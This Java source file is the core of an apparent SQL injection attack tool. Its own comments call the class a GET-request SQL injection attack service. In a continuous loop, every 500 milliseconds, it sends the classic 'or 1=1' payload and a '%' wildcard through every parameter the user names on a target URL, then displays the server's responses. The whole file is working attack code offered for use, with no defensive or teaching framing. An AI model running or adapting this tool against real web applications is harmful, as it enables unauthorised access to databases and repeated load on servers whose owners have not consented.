package com.lzf.inject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import com.lzf.gui.MainPanel;

/**
 * GET请求的SQL注入攻击服务
 *
 */
public class GetSQLInject extends Thread {
	private String url;
	private String params;
	private boolean isSQLInject = false; // 是否执行SQL注入攻击：true开始攻击或正在攻击；false停止攻击。

	public boolean isSQLInject() {
		return isSQLInject;
	}

	public void setSQLInject(boolean isSQLInject) {
		this.isSQLInject = isSQLInject;
	}

	public String getUrl() {
		return url;
	}

	public void setUrl(String url) {
		this.url = url;
	}

	public String getParams() {
		return params;
	}

	public void setParams(String params) {
		this.params = params;
	}

	/**
	 * 将流转化为二进制数组 从流中读取数据
	 */
	private byte[] binary(InputStream inputStream) throws IOException {
		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
		byte[] buffer = new byte[1024];
		int len = 0;
		// 从输入流中读取一定数量的字节，并将其存储在缓冲区数组buffer中
		while ((len = inputStream.read(buffer)) != -1) {
			byteArrayOutputStream.write(buffer, 0, len);
		}
		inputStream.close();
		return byteArrayOutputStream.toByteArray();
	}

	/**
	 * 向指定URL发送GET请求
	 */
	private void get(String urlSuffix) {
		String html = "fail"; // 连接不到服务器，请检查你的网络或稍后重试
		HttpURLConnection conn = null;
		try {
			System.out.println(url + urlSuffix);
			conn = (HttpURLConnection) new URL(url + urlSuffix).openConnection();
			conn.setConnectTimeout(5000);
			conn.setRequestMethod("GET");
			System.out.println(conn.getResponseCode());
			if (conn.getResponseCode() == 200) {
				InputStream in = conn.getInputStream();
				byte[] data = binary(in);
				html = new String(data, "UTF-8");
				in.close();
			} else {
				html += "：" + conn.getResponseCode() + "；" + conn.getResponseMessage();
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (conn != null) {
				conn.disconnect();
			}
		}
		MainPanel.setText(html);
	}

	@Override
	public void run() {
		super.run();
		while (isSQLInject) {
			try {
				String tempURLSuffix = "";
				if (!"".equals(params) && params != null) {
					String[] paramsArray = params.split("-");
					for (int i = 0; i < paramsArray.length; i++) {
						if (i == 0) {
							if (paramsArray.length == 1) {
								tempURLSuffix += "?" + paramsArray[i] + "=root%27%20or%201=%271";
							} else {
								tempURLSuffix += "?" + paramsArray[i] + "=root%27%20or%201=%271&";
							}
						} else if (i < paramsArray.length - 1) {
							tempURLSuffix += paramsArray[i] + "=root%27%20or%201=%271&";
						} else {
							tempURLSuffix += paramsArray[i] + "=root%27%20or%201=%271";
						}
					}
				}
				get(tempURLSuffix);
				Thread.sleep(500);
				tempURLSuffix = "";
				if (!"".equals(params) && params != null) {
					String[] paramsArray = params.split("-");
					for (int i = 0; i < paramsArray.length; i++) {
						if (i == 0) {
							if (paramsArray.length == 1) {
								tempURLSuffix += "?" + paramsArray[i] + "=%";
							} else {
								tempURLSuffix += "?" + paramsArray[i] + "=%&";
							}
						} else if (i < paramsArray.length - 1) {
							tempURLSuffix += paramsArray[i] + "=%&";
						} else {
							tempURLSuffix += paramsArray[i] + "=%";
						}
					}
				}
				get(tempURLSuffix);
				Thread.sleep(500);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
	}
}
